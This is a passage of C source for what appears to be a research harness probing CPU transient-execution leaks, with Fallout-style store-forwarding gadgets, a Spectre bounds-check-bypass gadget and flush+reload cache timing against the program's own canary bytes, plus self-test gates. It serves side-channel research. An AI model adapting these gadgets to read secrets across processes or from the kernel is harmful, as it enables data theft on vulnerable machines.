        if (cseq_vaddr)
            atk += ((unsigned char)*(volatile unsigned char *)
                    (page_v + PAGE_OFFSET)) >> 12;
        if (cseq_poison || cseq_poison_full || cseq_poison_other ||
            cseq_noppre || cseq_loadal) {
            unsigned int v;

            if (cseq_poison)
                asm volatile("movb $0x2a, %%al\n\t"
                             "movb (%1), %%al\n\t"
                             "movzbl %%al, %0"
                             : "=r"(v) : "a"(atk) : "memory");
            else if (cseq_poison_full)
                asm volatile("movl $0x2a, %%eax\n\t"
                             "movb (%1), %%al\n\t"
                             "movzbl %%al, %0"
                             : "=r"(v) : "a"(atk) : "memory");
            else if (cseq_poison_other)
                asm volatile("movb $0x2a, %%dl\n\t"
                             "movb (%1), %%al\n\t"
                             "movzbl %%al, %0"
                             : "=r"(v) : "a"(atk) : "rdx", "memory");
            else if (cseq_noppre)
                asm volatile("nop\n\t"
                             "movb (%1), %%al\n\t"
                             "movzbl %%al, %0"
                             : "=r"(v) : "a"(atk) : "memory");
            else
                asm volatile("movb (%1), %%al\n\tmovzbl %%al, %0"
                             : "=r"(v) : "a"(atk) : "memory");
            off = (size_t)((v ^ 0x3f) & 0x3f) * (size_t)SLOT_SIZE;
        } else if (cseq_asmchain) {
            asm volatile("movb (%1), %%al\n\t"
                         "xorb $0x3f, %%al\n\t"
                         "movzbl %%al, %%eax\n\t"
                         "and $0x3f, %%eax\n\t"
                         "imul $0x1040, %%rax, %0"
                         : "=r"(off) : "r"(atk) : "rax", "memory");
        } else {
            off = (size_t)((atk[0] ^ 0x3f) & 0x3f) * (size_t)SLOT_SIZE;
        }
        maccess_line(oracle_lo + off);
    }
cseq_pdone:
    return;
}

static void (*probe_fn)(void);

static void attempt(int arm)
{
    if (probe_fn) {
        if (use_sj) {
            if (setjmp(sj_buf) == 0)
                probe_fn();
        } else {
            probe_fn();
        }
    } else {
        arm_action(arm);
    }
}

struct round_result {
    int best;
    int hot;
    uint64_t best_t;
    uint64_t second_t;
    uint64_t true_t;
};

static uint64_t last_t[LO_CLASSES];

static struct round_result scan_round(int arm, int true_class)
{
    struct round_result r;
    int c;

    memset(&r, 0, sizeof(r));
    r.best = -1;
    r.best_t = ~0ULL;
    r.second_t = ~0ULL;
    r.true_t = ~0ULL;

    for (c = 0; c < LO_CLASSES; c++) {
        char *slot = oracle_lo + (uint64_t)c * SLOT_SIZE;
        uint64_t t;

        if (use_fresh)
            fresh_page_v();
        flush_line(slot);
        attempt(arm);
        t = reload_time(slot);
        last_t[c] = t;
        if (c == true_class)
            r.true_t = t;
        if (t < HOT_CYCLES)
            r.hot++;
        if (t < r.best_t) {
            r.second_t = r.best_t;
            r.best_t = t;
            r.best = c;
        } else if (t < r.second_t) {
            r.second_t = t;
        }
    }
    return r;
}

/* TRIALS executions of one slot. Returns the hit count. */
static int measure_slot(int cls, int n)
{
    char *slotp = oracle_lo + (uint64_t)cls * SLOT_SIZE;
    int i, hits = 0;

    for (i = 0; i < n; i++) {
        if (use_fresh)
            fresh_page_v();
        flush_line(slotp);
        attempt(0);
        if (reload_time(slotp) < HOT_CYCLES)
            hits++;
    }
    return hits;
}

static int arch_touch_decodes(int value)
{
    int true_class = value & 0x3f;
    int c, best = -1, hot = 0;
    uint64_t best_t = ~0ULL;

    for (c = 0; c < LO_CLASSES; c++) {
        char *slot = oracle_lo + (uint64_t)c * SLOT_SIZE;
        uint64_t t;

        flush_line(slot);
        (void)reload_time(oracle_lo + (uint64_t)true_class * SLOT_SIZE);
        t = reload_time(slot);
        if (t < HOT_CYCLES)
            hot++;
        if (t < best_t) {
            best_t = t;
            best = c;
        }
    }
    printf("selftest: arch touched=0x%02x best=%d best_t=%llu hot=%d -> %s\n",
           value, best, (unsigned long long)best_t, hot,
           (best == true_class && hot == 1) ? "OK" : "MISMATCH");
    return best == true_class && hot == 1;
}

static int geometry_ok(void)
{
    static char __attribute__((aligned(0x1000))) probe[SLOT_SIZE * 2];
    unsigned long alone, same_set, other_set;
    char *p = oracle_lo + 7 * SLOT_SIZE;
    unsigned long cold, hot;

    flush_line(p);
    cold = reload_time(p);
    hot = reload_time(p);
    printf("timing: cold=%lu hot=%lu threshold=%d\n", cold, hot, HOT_CYCLES);
    if (!(cold >= HOT_CYCLES && hot < HOT_CYCLES)) {
        printf("selftest: timing sanity MISMATCH\n");
        return 0;
    }

    flush_line(probe);
    alone = reload_time(probe);
    flush_line(probe);
    (void)reload_time(probe + 0x1000);
    same_set = reload_time(probe);
    flush_line(probe);
    (void)reload_time(probe + 0x40);
    other_set = reload_time(probe);
    printf("probe: flush+reload=%lu +load(same set)=%lu +load(other set)=%lu\n",
           alone, same_set, other_set);
    if (!(alone >= HOT_CYCLES && same_set < HOT_CYCLES && other_set >= HOT_CYCLES)) {
        printf("selftest: set geometry MISMATCH\n");
        return 0;
    }
    return 1;
}

static int parse_env(void)
{
    const char *s;
    char *end;
    long v;

    s = getenv("ROUNDS");
    if (s && *s) {
        v = strtol(s, &end, 0);
        if (*end || v < 1 || v > MAX_ROUNDS) {
            fprintf(stderr, "ROUNDS must be 1..%d\n", MAX_ROUNDS);
            return -1;
        }
        rounds = (int)v;
    }

    s = getenv("CANARY");
    if (s && *s) {
        v = strtol(s, &end, 0);
        if (*end || v < 0 || v > 255) {
            fprintf(stderr, "CANARY must be a byte (0..255)\n");
            return -1;
        }
        canary = (int)v;
    }

    s = getenv("OFFSET");
    if (s && *s) {
        v = strtol(s, &end, 0);
        if (*end || v < 0 || v > 0xfff) {
            fprintf(stderr, "OFFSET must be 0..0xfff\n");
            return -1;
        }
        page_offset = (int)v;
    }

    s = getenv("TRIALS");
    if (s && *s) {
        v = strtol(s, &end, 0);
        if (*end || v < 1 || v > 256) {
            fprintf(stderr, "TRIALS must be 1..256\n");
            return -1;
        }
        trials = (int)v;
    }

    s = getenv("SLOT");
    if (s && *s) {
        v = strtol(s, &end, 0);
        if (*end || v < 0 || v >= LO_CLASSES) {
            fprintf(stderr, "SLOT must be 0..63\n");
            return -1;
        }
        slot_only = (int)v;
    }

    if (getenv("NC") != NULL) {
        use_nc = 1;
        trig_mode = TRIG_NONCANON;
    }
    s = getenv("TRIGGER");
    if (s && *s) {
        if (strcmp(s, "noncanon") == 0) {
            use_nc = 1;
            trig_mode = TRIG_NONCANON;
        } else if (strcmp(s, "protnone") == 0) {
            trig_mode = TRIG_PROTNONE;
        } else if (strcmp(s, "assist") == 0) {
            trig_mode = TRIG_ASSIST;
        } else if (strcmp(s, "demand") == 0) {
            trig_mode = TRIG_DEMAND;
        } else {
            fprintf(stderr,
                    "TRIGGER must be noncanon|protnone|assist|demand\n");
            return -1;
        }
    }
    if (getenv("VFLUSH") != NULL)
        use_vflush = 1;
    s = getenv("GADGET");
    if (s && strcmp(s, "ref") == 0)
        use_ref = 1;
    if (getenv("CSEQ") != NULL)
        use_cseq = 1;
    if (getenv("NOSTORE") != NULL)
        cseq_store = 0;
    if (getenv("CSEQ_BLOCK") != NULL)
        cseq_block = 1;
    if (getenv("CSEQ_ASMSTORE") != NULL)
        cseq_asmstore = 1;
    if (getenv("CSEQ_RIP") != NULL)
        cseq_rip = 1;
    if (getenv("CSEQ_SJFIRST") != NULL)
        cseq_sjfirst = 1;
    if (getenv("CSEQ_FENCE") != NULL)
        cseq_fence = 1;
    if (getenv("CSEQ_LFENCE") != NULL)
        cseq_lfence = 1;
    if (getenv("CSEQ_LOADAL") != NULL)
        cseq_loadal = 1;
    if (getenv("CSEQ_ASMCHAIN") != NULL)
        cseq_asmchain = 1;
    if (getenv("CSEQ_POISON") != NULL)
        cseq_poison = 1;
    if (getenv("CSEQ_VF") != NULL)
        cseq_vf = 1;
    if (getenv("CSEQ_PROLOGUE") != NULL)
        cseq_prologue = 1;
    if (getenv("CSEQ_VADDR") != NULL)
        cseq_vaddr = 1;
    if (getenv("CSEQ_NOPPRE") != NULL)
        cseq_noppre = 1;
    if (getenv("CSEQ_POISON_FULL") != NULL)
        cseq_poison_full = 1;
    if (getenv("CSEQ_POISON_OTHER") != NULL)
        cseq_poison_other = 1;
    if (getenv("FRESH") != NULL)
        use_fresh = 1;
    if (getenv("SETJMP") != NULL)
        use_sj = 1;

    if (getenv("SPEC") != NULL)
        use_spec = 1;
    s = getenv("SPEC_TARGET");
    if (s && *s) {
        use_spec = 1;
        if (strcmp(s, "noncanon") == 0)
            spec_target = SPEC_TGT_NONCANON;
        else if (strcmp(s, "present") == 0)
            spec_target = SPEC_TGT_PRESENT;
        else if (strcmp(s, "protnone") == 0)
            spec_target = SPEC_TGT_PROTNONE;
        else {
            fprintf(stderr,
                    "SPEC_TARGET must be noncanon|present|protnone\n");
            return -1;
        }
    }
    s = getenv("SPEC_STORE");
    if (s && *s) {
        if (strcmp(s, "late") == 0)
            spec_store_mode = SPEC_ST_LATE;
        else if (strcmp(s, "early") == 0)
            spec_store_mode = SPEC_ST_EARLY;
        else if (strcmp(s, "none") == 0)
            spec_store_mode = SPEC_ST_NONE;
        else {
            fprintf(stderr, "SPEC_STORE must be late|early|none\n");
            return -1;
        }
    }
    s = getenv("SPEC_SELFTEST");
    if (s && *s) {
        v = strtol(s, &end, 0);
        if (*end || v < 1 || v > 2) {
            fprintf(stderr, "SPEC_SELFTEST must be 1 or 2\n");
            return -1;
        }
        spec_selftest = (int)v;
        use_spec = 1;
    }
    s = getenv("SPEC_DELAY");
    if (s && *s) {
        v = strtol(s, &end, 0);
        if (*end || v < 0 || v > 100000) {
            fprintf(stderr, "SPEC_DELAY must be 0..100000\n");
            return -1;
        }
        spec_delay = (int)v;
    }
    s = getenv("SPEC_TFLUSH");
    if (s && *s)
        spec_tflush = (strcmp(s, "0") != 0);
    s = getenv("SPEC_VFLUSH");
    if (s && *s)
        spec_vflush = (strcmp(s, "0") != 0);

    /*
     * Conflicts are hard errors, never a silent preference. page_atk = NC_BASE
     * would otherwise win over TRIGGER=assist and the run would look exactly
     * like the ordinary hot base.
     */
    trig_zero_fault = (trig_mode == TRIG_ASSIST || trig_mode == TRIG_DEMAND);
    if (use_nc && trig_zero_fault) {
        fprintf(stderr, "NC=1 conflicts with TRIGGER=assist|demand\n");
        return -1;
    }
    if (trig_zero_fault && (!use_cseq || slot_only < 0)) {
        fprintf(stderr, "TRIGGER=assist|demand needs CSEQ=1 and SLOT\n");
        return -1;
    }
    if (use_spec) {
        if (trig_zero_fault) {
            fprintf(stderr, "SPEC=1 conflicts with TRIGGER=assist|demand\n");
            return -1;
        }
        if (use_cseq) {
            fprintf(stderr, "SPEC=1 conflicts with CSEQ=1\n");
            return -1;
        }
        if (use_fresh) {
            fprintf(stderr, "SPEC=1 conflicts with FRESH=1\n");
            return -1;
        }
        if (slot_only < 0 && !spec_selftest) {
            fprintf(stderr, "SPEC=1 needs SLOT\n");
            return -1;
        }
    }
    return 0;
}

static int pin_cpu(int cpu)
{
    cpu_set_t set;

    if (cpu < 0 || cpu >= CPU_SETSIZE) {
        fprintf(stderr, "CPU %d is out of range\n", cpu);
        return -1;
    }
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    if (sched_setaffinity(0, sizeof(set), &set) != 0) {
        fprintf(stderr, "sched_setaffinity(%d): %s\n", cpu, strerror(errno));
        return -1;
    }
    if (sched_getcpu() != cpu) {
        fprintf(stderr, "running on cpu %d after pinning to %d\n",
                sched_getcpu(), cpu);
        return -1;
    }
    return 0;
}

static int cpu_from_env(void)
{
    const char *s = getenv("CPU");
    char *end;
    long v;

    if (!s || !*s)
        return DEFAULT_CPU;
    v = strtol(s, &end, 0);
    if (*end || v < 0 || v >= CPU_SETSIZE)
        return -1;
    return (int)v;
}

/* ------------------------------------------------------------------------
 * Arm A: TRIGGER=assist / TRIGGER=demand. The load retires, so there is no
 * SIGSEGV and faults=0 is expected. Everything here runs outside the measured
 * window except trig_pre(), which runs once per attempt before the store.
 * ------------------------------------------------------------------------ */

static unsigned long trig_minflt(void)
{
    struct rusage ru;

    if (getrusage(RUSAGE_SELF, &ru) != 0)
        return 0;
    return (unsigned long)ru.ru_minflt;
}

/* Referenced: in kB for the VMA that holds page_atk, or -1 if not found. */
static long trig_referenced_kb(void)
{
    char line[256];
    FILE *f;
    unsigned long start, end;
    int in_vma = 0;
    long kb = -1;

    f = fopen("/proc/self/smaps", "r");
    if (f == NULL)
        return -1;
    while (fgets(line, sizeof(line), f) != NULL) {
        if (sscanf(line, "%lx-%lx", &start, &end) == 2) {
            in_vma = ((uintptr_t)page_atk >= start &&
                      (uintptr_t)page_atk < end);
        } else if (in_vma && strncmp(line, "Referenced:", 11) == 0) {
            kb = strtol(line + 11, NULL, 10);
            break;
        }
    }
    fclose(f);
    return kb;
}

/*
 * The witness. Without it an Arm A run is VOID, not negative: clear_refs and
 * MADV_COLD both skip the shared zero page, so a read-only anonymous page
 * would give a clean-looking null while no assist ever happened. The minor
 * fault delta also separates the two modes -- an assist takes no fault, a
 * demand-zero fill takes exactly one -- so a reclaimed page cannot pass as an
 * assist.
 */
static int trig_gate(void)
{
    long before, after_clear, after_touch;
    unsigned long mf0, mf1;
    int adv;

    if (!trig_zero_fault)
        return 1;

    adv = (trig_mode == TRIG_ASSIST) ? MADV_COLD : MADV_DONTNEED;
    before = trig_referenced_kb();
    if (madvise(page_atk, 0x1000, adv) != 0) {
        fprintf(stderr, "madvise(%s): %s\n",
                trig_mode == TRIG_ASSIST ? "MADV_COLD" : "MADV_DONTNEED",
                strerror(errno));
        return 0;
    }
    after_clear = trig_referenced_kb();
    mf0 = trig_minflt();
    (void)*(volatile unsigned char *)(page_atk + PAGE_OFFSET);
    mf1 = trig_minflt();
    after_touch = trig_referenced_kb();

    printf("trig gate: mode=%s referenced_kb before=%ld after_clear=%ld "
           "after_touch=%ld minflt_delta=%lu\n",
           trig_mode == TRIG_ASSIST ? "assist" : "demand",
           before, after_clear, after_touch, mf1 - mf0);

    /*
     * Deltas, not absolutes: the kernel merges this mmap with the neighbouring
     * anonymous mappings, so page_atk's VMA is larger than one page and
     * Referenced: counts all of it. What must hold is that the advice cleared
     * the accessed bit of exactly ONE page (4 kB).
     */
    if (before < 0 || after_clear < 0 || after_touch < 0) {
        printf("trig gate: FAIL could not read Referenced: for page_atk's VMA "
               "-> VOID\n");
        return 0;
    }
    if (before - after_clear != 4) {
        printf("trig gate: FAIL the advice did not clear the accessed bit of "
               "exactly one page -> shared zero page, or the advice is "
               "unsupported -> VOID\n");
        return 0;
    }
    if (trig_mode == TRIG_ASSIST) {
        if (mf1 != mf0) {
            printf("trig gate: FAIL assist mode took a minor fault, so the "
                   "page was reclaimed and this is the demand path -> VOID\n");
            return 0;
        }
        if (after_touch - after_clear != 4) {
            printf("trig gate: FAIL the touch did not set the accessed bit "
                   "back -> VOID\n");
            return 0;
        }
    } else {
        /*
         * MADV_DONTNEED drops the page, so the read fault re-maps the shared
         * zero page, which Referenced: does not count. The minor fault is the
         * witness here, not the accessed bit coming back.
         */
        if (mf1 == mf0) {
            printf("trig gate: FAIL demand mode took no minor fault -> VOID\n");
            return 0;
        }
    }
    printf("trig gate: PASS\n");
    return 1;
}

static void trig_pre(void)
{
    if (trig_mode == TRIG_ASSIST) {
        if (madvise(page_atk, 0x1000, MADV_COLD) != 0)
            trig_madv_fail++;
    } else if (trig_mode == TRIG_DEMAND) {
        if (madvise(page_atk, 0x1000, MADV_DONTNEED) != 0)
            trig_madv_fail++;
    }
    /*
     * Set A and D on page_v's PTE away from the victim line, so the canary
     * store does not take an assist of its own inside the measured window.
     * A barrier BEFORE the store is safe: the measured killer (CSEQ_FENCE,
     * CSEQ_LFENCE, 0/8 twice each) is a barrier BETWEEN the store and the
     * faulting load. Offset 0x800 is L1 set 32 and is never scored, and it is
     * not offset 0, so fresh_page_v()'s "no write at offset 0" property holds.
     */
    *(volatile unsigned char *)(page_v + TRIG_PRETOUCH_OFF) = 0;
    asm volatile("lfence" ::: "memory");
}

/*
 * A volatile function pointer, so gcc can neither inline nor clone leak_cseq
 * into this wrapper: the hot body stays byte-identical and the objdump diff
 * can prove it. The indirect call happens before the store, outside the
 * measured window.
 */
static void (*volatile trig_inner)(void) = leak_cseq;

static void __attribute__((noinline)) leak_cseq_trig(void)
{
    trig_pre();
    trig_inner();
}

/* ------------------------------------------------------------------------
 * Arm B: SPEC=1. Kocher bounds-check bypass ported from
 * labs/foreshadow/harness/mispredict_gadget.h, shimmed onto this binary's own
 * maccess_line()/reload_time() rather than libsgxstep/cache.h, which is not
 * vendored in this repo.
 * ------------------------------------------------------------------------ */

/*
 * Bare clflush. NOT flush_line(): that one ends in mfence, which drains the
 * store buffer, and inside the inner loop that would silently reinvent the
 * measured CSEQ_FENCE killer.
 */
static inline void spec_flush_bare(void *p)
{
    asm volatile("clflush (%0)" :: "r"(p) : "memory");
}

/*
 * The gate is only ever flushed, never written after setup: a
 * written-then-flushed bound is store-forwarded, the branch resolves fast and
 * never mispredicts. The index transform is this binary's key,
 * (v ^ 0x3f) & 0x3f, not the header's bare v & 0x3f -- with the wrong one
 * every class is off by a xor and 61/63 mean nothing.
 */
static void __attribute__((noinline)) spec_gadget(size_t x)
{
    if (x < *spec_bound_p) {
        /*
         * Written as asm, not as C, for one measured reason: the suppressor
         * is any preceding write to the shadow load's DESTINATION register,
         * and gcc's own codegen trips it. Compiled from C this reads
         *   mov spec_bound_p,%rax ; mov (%rax),%rax ; ... ; movzbl (%rdi),%eax
         * so RAX is written twice before the shadow load that targets EAX --
         * and the second writer is the CLFLUSH'd bound load, a DRAM miss that
         * is still in flight exactly when the forward would have to happen.
         * That is the measured killer at its worst. Pinning the destination to
         * rdx keeps the bound load's rax out of the dependent chain. The tail
         * otherwise mirrors the stock LEAK_TAIL shape.
         */
        asm volatile(
            "movzbl (%1), %%edx\n\t"
            "xorb $0x3f, %%dl\n\t"
            "movzbl %%dl, %%edx\n\t"
            "and $0x3f, %%edx\n\t"
            "imul %2, %%rdx\n\t"
            "movq (%0, %%rdx), %%rdx\n\t"
            :
            : "r"(spec_oracle),
              "r"((uintptr_t)spec_array + x),
              "r"((unsigned long)SLOT_SIZE)
            : "rdx", "memory");
    }
}

static void spec_store_canary(void)
{
    if (spec_vflush)
        asm volatile("clflush (%0)" :: "r"(page_v + PAGE_OFFSET) : "memory");
    *(volatile unsigned char *)(page_v + PAGE_OFFSET) = (unsigned char)canary;
}

/*
 * Training and attack interleaved, malicious every 6th, selected branchlessly:
 * 32 sequential trainings then one attack does not mispredict on this box. The
 * store runs on EVERY inner iteration, so its presence cannot correlate with
 * the malicious index.
 */
static void spec_attempt(void)
{
    int j;

    for (j = SPEC_INNER - 1; j >= 0; j--) {
        volatile int z;
        long m;
        size_t x;

        if (spec_store_mode == SPEC_ST_EARLY)
            spec_store_canary();
        spec_flush_bare((void *)(uintptr_t)spec_bound_p);
        if (spec_tflush && spec_target == SPEC_TGT_PRESENT)
            spec_flush_bare(spec_target_p);
        for (z = 0; z < spec_delay; z++) { }
        if (spec_store_mode == SPEC_ST_LATE)
            spec_store_canary();

        m = ((long)(j % 6) - 1) & ~0xFFFFL;
        m = m | (m >> 16);
        x = spec_training_x ^ ((size_t)m & (spec_malicious_x ^ spec_training_x));
        spec_gadget(x);
    }
}

static const char *spec_target_name(void)
{
    if (spec_target == SPEC_TGT_NONCANON)
        return "noncanon";
    if (spec_target == SPEC_TGT_PRESENT)
        return "present";
    return "protnone";
}

static const char *spec_store_name(void)
{
    if (spec_store_mode == SPEC_ST_LATE)
        return "late";
    if (spec_store_mode == SPEC_ST_EARLY)
        return "early";
    return "none";
}

static void spec_retarget(void)
{
    uintptr_t t;

    if (spec_target == SPEC_TGT_NONCANON)
        t = (uintptr_t)(NC_BASE + (unsigned long)PAGE_OFFSET);
    else if (spec_target == SPEC_TGT_PROTNONE)
        t = (uintptr_t)(spec_region + SPEC_OFF_PROTNON + PAGE_OFFSET);
    else
        t = (uintptr_t)(spec_present + PAGE_OFFSET);

    spec_target_p = (uint8_t *)t;
    /*
     * Unsigned, so every malicious index is far above the bound and the branch
     * is architecturally NOT taken -- including the non-canonical target,
     * which as a signed offset would be negative and would make the branch
     * taken and the load really fault.
     */
    spec_malicious_x = (size_t)(t - (uintptr_t)spec_array);
}

static int spec_setup(void)
{
    spec_region = mmap(NULL, SPEC_REGION_SZ, PROT_READ | PROT_WRITE,
                       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (spec_region == MAP_FAILED) {
        fprintf(stderr, "mmap(spec): %s\n", strerror(errno));
        return 0;
    }
    memset(spec_region, 0, SPEC_REGION_SZ);

    spec_array = spec_region + SPEC_OFF_ARRAY;
    spec_present = spec_region + SPEC_OFF_PRESENT;
    spec_bound_p = (volatile size_t *)(spec_region + SPEC_OFF_BOUND +
                                       SPEC_BOUND_OFF);
    spec_oracle = oracle_lo;

    *spec_bound_p = SPEC_BOUND_VAL;           /* written exactly once, here */
    spec_array[SPEC_TRAIN_IDX] = SPEC_TRAIN_VAL;

    if (mprotect(spec_region + SPEC_OFF_PROTNON, 0x1000, PROT_NONE) != 0) {
        fprintf(stderr, "mprotect(spec protnone): %s\n", strerror(errno));
        return 0;
    }
    spec_retarget();
    return 1;
}

/*
 * In-process gate. The misprediction rate is state-dependent, so this cannot
 * be a separate discipline step in another process. Leg 1 proves the gadget
 * mispredicts, the shadow load runs, the touch survives and the decoder works.
 * Leg 2 measures the class-61 false-positive rate that the negative sentence
 * depends on. Both legs run warm, with the store off.
 */
static int spec_gate(void)
{
    int save_target = spec_target;
    int save_store = spec_store_mode;
    int save_tflush = spec_tflush;
    int h61, h63, ok = 1;

    spec_target = SPEC_TGT_PRESENT;
    spec_store_mode = SPEC_ST_NONE;
    spec_tflush = 0;
    spec_retarget();
    probe_fn = spec_attempt;

    if (spec_selftest == 0 || spec_selftest == 1) {
        spec_present[PAGE_OFFSET] = 0x42;
        h61 = measure_slot(CLS_CANARY, trials);
        h63 = measure_slot(CLS_ZERO, trials);
        printf("spec gate1 plant=0x42 c61=%d/%d c63=%d/%d pass=%d\n",
               h61, trials, h63, trials, h61 * 2 > trials);
        if (!(h61 * 2 > trials))
            ok = 0;
    }
    if (spec_selftest == 0 || spec_selftest == 2) {
        spec_present[PAGE_OFFSET] = 0x00;
        h63 = measure_slot(CLS_ZERO, trials);
        h61 = measure_slot(CLS_CANARY, trials);
        printf("spec gate2 plant=0x00 c63=%d/%d c61=%d/%d pass=%d\n",
               h63, trials, h61, trials,
               (h63 * 2 > trials) && !(h61 * 2 > trials));
        if (!(h63 * 2 > trials))
            ok = 0;
        if (h61 * 2 > trials)
            ok = 0;
    }

    probe_fn = NULL;
    spec_present[PAGE_OFFSET] = 0x00;
    spec_target = save_target;
    spec_store_mode = save_store;
    spec_tflush = save_tflush;
    spec_retarget();
    printf("spec gate: %s\n", ok ? "PASS" : "FAIL");
    return ok;
}

static int run_spec(void)
{
    int rnd, hits, maj_n = 0;

    if (slot_only < 0 && !spec_selftest) {
        fprintf(stderr, "SPEC needs SLOT\n");
        return 2;
    }
    if (!spec_setup())
        return 2;

    printf("spec target=%s store=%s vflush=%d tflush=%d delay=%d inner=%d "
           "bound_set=%d array_set=%d train_class=%d malicious_x=0x%zx\n",
           spec_target_name(), spec_store_name(), spec_vflush, spec_tflush,
           spec_delay, SPEC_INNER,
           (int)(((uintptr_t)spec_bound_p >> 6) & 63),
           (int)((((uintptr_t)spec_array + SPEC_TRAIN_IDX) >> 6) & 63),
           CLS_TRAIN, spec_malicious_x);

    if (!spec_gate()) {
        printf("verdict: VOID spec_gate_fail\n");
        return 1;
    }
    if (spec_selftest) {
        printf("verdict: SPEC_SELFTEST_OK\n");
        return 0;
    }

    probe_fn = spec_attempt;
    for (rnd = 0; rnd < rounds; rnd++) {
        hits = measure_slot(slot_only, trials);
        if (hits * 2 > trials)
            maj_n++;
        printf("spec slot=%d round=%d hits=%d/%d majority=%d stray=%lu\n",
               slot_only, rnd, hits, trials, hits * 2 > trials, stray_faults);
    }
    printf("spec slot=%d majority_rounds=%d/%d repeatable=%d\n",
           slot_only, maj_n, rounds, maj_n * 2 > rounds);
    probe_fn = NULL;
    printf("spec_result: rates only, two-run rule is outside this process. "
           "One SPEC attempt is %d inner iterations of which %d are malicious, "
           "so its per-attempt rate is not on the CSEQ scale.\n",
           SPEC_INNER, (SPEC_INNER + 5) / 6);
    return 0;
}

int main(void)
{
    struct sigaction sa;
    int cpu, true_class, arm, i;
    int store_true_hot = 0, fence_true_hot = 0, nostore_true_hot = 0;
    unsigned long store_faults = 0;

    setvbuf(stdout, NULL, _IOLBF, 0);
    if (parse_env() != 0)
        return 2;
    cpu = cpu_from_env();
    if (cpu < 0) {
        fprintf(stderr, "CPU must be a logical cpu number\n");
        return 2;
    }
    if (pin_cpu(cpu) != 0)
        return 2;

    true_class = canary & 0x3f;
    printf("fallout-oneshot: cpu=%d canary=0x%02x class=0x%02x "
           "offset=0x%x(set %d) block=0x%x(set %d) rounds=%d slot=0x%x hot<%d "
           "fault=%s gadget=%s vflush=%d fresh=%d setjmp=%d\n",
           cpu, canary, true_class,
           PAGE_OFFSET, PAGE_OFFSET >> 6, BLOCK_OFFSET, BLOCK_OFFSET >> 6,
           rounds, SLOT_SIZE, HOT_CYCLES, use_nc ? "nc-gp" : "prot-none",
           use_ref ? "ref" : "value", use_vflush, use_fresh, use_sj);

    /*
     * A SECOND line, never an edit to the one above: every logged run and
     * every grep script that parses it keeps working. Emitted for the new
     * arms, and on demand via ADDRDUMP=1 for the placement-vs-bimodality
     * burst (stack set and oracle page against hot/cold across a burst).
     */
    if (trig_mode != TRIG_PROTNONE || use_spec || getenv("ADDRDUMP") != NULL) {
        static const char *const trig_names[] = {
            "protnone", "noncanon", "assist", "demand"
        };

        printf("arm2: trigger=%s spec=%d zero_fault=%d "
               "stack_set=%d oracle_page=0x%lx excluded=0,1,3,%d,%d,60,62\n",
               trig_names[trig_mode], use_spec, trig_zero_fault,
               (int)(((uintptr_t)&cpu >> 6) & 63),
               (unsigned long)((uintptr_t)oracle_lo >> 12),
               CLS_TRAIN, (CLS_TRAIN + 1) & 0x3f);
    }

    if (!geometry_ok() || !arch_touch_decodes(canary))
        return 1;
    if (getenv("SELFTEST") != NULL) {
        printf("verdict: SELFTEST_OK\n");
        return 0;
    }

    page_v = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                  MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    page_block = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (use_nc)
        page_atk = (uint8_t *)NC_BASE;
    else if (trig_zero_fault)
        page_atk = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    else
        page_atk = mmap(NULL, 0x1000, PROT_NONE,
                        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (page_v == MAP_FAILED || page_block == MAP_FAILED ||
        (!use_nc && page_atk == MAP_FAILED)) {
        fprintf(stderr, "mmap: %s\n", strerror(errno));
        return 2;
    }
    /*
     * Mandatory for the zero-fault arms: a freshly mmap'd anonymous page that
     * has only ever been READ is the shared zero page, and both MADV_COLD and
     * clear_refs skip it (vm_normal_page() returns NULL). Writing it makes it
     * a private anon folio, so the accessed bit can actually be cleared. Skip
     * this and the arm measures a plain present-page read while looking like
     * a clean negative.
     */
    if (trig_zero_fault)
        memset(page_atk, 0, 0x1000);
    memset(page_v, 0, 0x1000);
    page_block[BLOCK_OFFSET] = 0;
    asm volatile("mfence" ::: "memory");

    memset(&sa, 0, sizeof(sa));
    if (trig_zero_fault || use_spec) {
        sa.sa_sigaction = guard_handler;
        sa.sa_flags = SA_SIGINFO;
    } else if ((use_cseq && !cseq_rip) || (!use_cseq && use_sj)) {
        sa.sa_handler = sj_handler;
    } else {
        sa.sa_sigaction = fault_handler;
        sa.sa_flags = SA_SIGINFO;
    }
    sigemptyset(&sa.sa_mask);
    if (sigaction(SIGSEGV, &sa, NULL) != 0) {
        fprintf(stderr, "sigaction: %s\n", strerror(errno));
        return 2;
    }

    if (use_spec)
        return run_spec();
    if (trig_zero_fault && !trig_gate()) {
        printf("verdict: VOID trig_gate_fail\n");
        return 1;
    }

    /*
     * PROBE=1 does not score the canary. fixed asks whether an oracle load
     * after the fault is still visible at reload. dep asks whether the loaded
     * byte steers that index. A cold canary is not interpreted here.
     */
    if (getenv("PROBE") != NULL && slot_only >= 0) {
        static void (*const fns[])(void) = { leak_fixed, leak_dep };
        static const char *names[] = { "fixed", "dep" };
        int p, rnd, hits, maj_n;
        unsigned long faults0;

        printf("probe slot=%d trials=%d rounds=%d; hit-rate is per execution\n",
               slot_only, trials, rounds);
        for (p = 0; p < 2; p++) {
            maj_n = 0;
            probe_fn = fns[p];
            for (rnd = 0; rnd < rounds; rnd++) {
                int majority;

                faults0 = fault_count;
                hits = measure_slot(slot_only, trials);
                majority = hits * 2 > trials;
                if (majority)
                    maj_n++;
                printf("probe=%s slot=%d round=%d hits=%d/%d majority=%d faults=%lu\n",
                       names[p], slot_only, rnd, hits, trials, majority,
                       fault_count - faults0);
            }
            printf("probe=%s slot=%d majority_rounds=%d/%d repeatable=%d\n",
                   names[p], slot_only, maj_n, rounds, maj_n * 2 > rounds);
        }
        probe_fn = NULL;
        printf("probe_slot_result: frequency only\n");
        return 0;
    }

    if (getenv("PROBE") != NULL) {
        static void (*const fns[])(void) = { leak_fixed, leak_dep };
        static const char *names[] = { "fixed", "dep" };
        int p;

        printf("probe key: fixed index=%d; dep poison=0x2a, "
               "class %d if the low six bits consumed by the xor are 0, "
               "class %d if al stays 0x2a. A full-scan 8/8 is eight samples "
               "of that one class, not 512 executions.\n",
               PROBE_CLASS, PROBE_CLASS, 0x2a ^ PROBE_CLASS);
